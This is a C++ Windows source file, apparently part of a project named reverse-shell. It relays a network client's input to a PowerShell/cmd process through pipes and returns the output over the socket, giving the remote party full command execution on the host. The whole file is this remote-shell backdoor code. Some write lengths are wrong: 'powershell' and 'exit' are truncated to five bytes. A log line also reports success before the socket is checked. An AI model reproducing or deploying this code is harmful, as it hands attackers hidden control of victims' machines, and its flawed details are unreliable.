#include "reverse-shell.h"

#define NO_CLIENT_YET 0x07
#define TELL_CLIENT 0x03
#define TELL_SHELL 0x05
#define MEOF 0x0
#define NOTHING_YET 0x08

extern reverseShell_t	shell;

char					shellBuffer[BUFFER_SIZE] = {}, clientBuffer[BUFFER_SIZE] = {};

int connexionNumber = 0;

static BYTE acceptClient(void) {
	shell.clientSocket = accept(shell.listenSocket, NULL, NULL);
	journalReport(L"Accepted client\n");
	std::cerr	<< "Client accepted\n";

	if (shell.clientSocket == INVALID_SOCKET) {
		if (WSAGetLastError() == WSAEWOULDBLOCK)
			return (NO_CLIENT_YET);
		journalReport(L"Invalid client socket \n");
		std::cerr	<< "Invalid socket on error: " << WSAGetLastError() << '\n';
		return (FAILURE);
	}
	u_long mode = 1;
	ioctlsocket(shell.clientSocket, FIONBIO, &mode);
	return (SUCCESS);
}
static BYTE tellToShell(void);

static BYTE waitForClient(void) {
	std::cerr	<< "Waiting for client\n";
	DWORD bytesWritten = 0;
	BOOL result = WriteFile(shell.parentWrite, "powershell\r\n", 5, &bytesWritten, NULL);
	Sleep(2000);
	BYTE client = acceptClient();
	//if (connexionNumber > 0) {
	//	std::cerr	<< "Pwd = " << bytesWritten << " (" << result << ")\n";
	//}
	//connexionNumber++;
	(void)result;
	return (client);
}

static BYTE thereIsDataInPipe(void) {
	DWORD bytesAvalaible = 0;
	BOOL success = PeekNamedPipe(shell.parentRead, NULL, NULL, NULL, &bytesAvalaible, NULL);
	return (success && bytesAvalaible > 0);
}

static BYTE readInsidePipe(void) {
	DWORD bytesRead = 0;
	if (!ReadFile(shell.parentRead, shellBuffer, BUFFER_SIZE-1, &bytesRead, NULL)) {
		std::cerr	<< "Failed to read file on error: " << GetLastError() << '\n';
		return (FAILURE);
	}
	shellBuffer[bytesRead] = '\0';
	return (SUCCESS);
}

static BYTE shellSaidSomething(void) {
	if (thereIsDataInPipe()) {
		if (readInsidePipe() == SUCCESS)
			return (TELL_CLIENT);
	}
	return (FAILURE);
}

static BYTE tellToClient(void) {
	int bytesSent = 0;
	bytesSent = send(shell.clientSocket, shellBuffer, (int)std::strlen(shellBuffer), NULL);
	if (bytesSent == SOCKET_ERROR) {
		std::cerr	<< "Failed to send to client on error: " << WSAGetLastError() << '\n';
		return (FAILURE);
	}
	ZeroMemory(shellBuffer, BUFFER_SIZE);
	return (SUCCESS);
}

static void saveLastPwd(void) {
	//char	buffer[BUFFER_SIZE] = {};
	DWORD bytesWritten = 0;
	BOOL result = WriteFile(shell.parentWrite, "exit\r\n", 5, &bytesWritten, NULL);
	(void)result;
	//Sleep(2000);
	//std::cerr	<< "Pwd = " << bytesWritten << " (" << result << ")\n";
	//ReadFile(shell.parentRead, buffer, BUFFER_SIZE-1, &bytesWritten, NULL);
	//buffer[bytesWritten] = '\0';
	//std::cerr	<< "LAST LINE: [" << buffer << "]\n";
	//std::string	pwd(buffer);
	//size_t lastNewline = pwd.rfind("\r\n");
	//pwd = pwd.substr(lastNewline + 1);
	//std::cerr	<< "LAST LINE: [" << pwd << "]\n";
	//ZeroMemory(buffer, BUFFER_SIZE);
}

static BYTE clientSaidSomething(void) {
	int bytesReceived = recv(shell.clientSocket, clientBuffer, BUFFER_SIZE-1, 0);
	if (bytesReceived == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK)
			return (NOTHING_YET);
		std::cerr	<< "Failed to recv from client on error: " << WSAGetLastError() << "\n";
		return (FAILURE);
	} else if (bytesReceived == MEOF) {
		std::cerr	<< "Client sent EOF\n";
		saveLastPwd();
		return (MEOF); // TODO define
	}
	clientBuffer[bytesReceived] = '\0';
	return (TELL_SHELL);
}

static BYTE tellToShell(void) {
	DWORD bytesWritten = 0;
	if (!WriteFile(shell.parentWrite, clientBuffer, (DWORD)std::strlen(clientBuffer), &bytesWritten, NULL)) {
		std::cerr	<< "Failed to write data in pipe on error: " << GetLastError() << '\n';
		return (FAILURE);
	}
	ZeroMemory(clientBuffer, BUFFER_SIZE);
	return (SUCCESS);
}

static void resetClient(void) {
	closesocket(shell.clientSocket);
}

BYTE startRoutine(void) {
	BYTE shellSaid = 0, clientSaid = 0;

	while (true) {
		if (waitForClient() == NO_CLIENT_YET)
			continue ;
		while (true) {
			Sleep(1000);
			clientSaid = clientSaidSomething();
			if (clientSaid == TELL_SHELL) {
				if (tellToShell() == FAILURE)
					return (FAILURE);
			} else if (clientSaid == MEOF)
				break ;

			shellSaid = shellSaidSomething();
			if (shellSaid == TELL_CLIENT) {
				if (tellToClient() == FAILURE)
					return (FAILURE);
			}
		}
		resetClient();
	}
}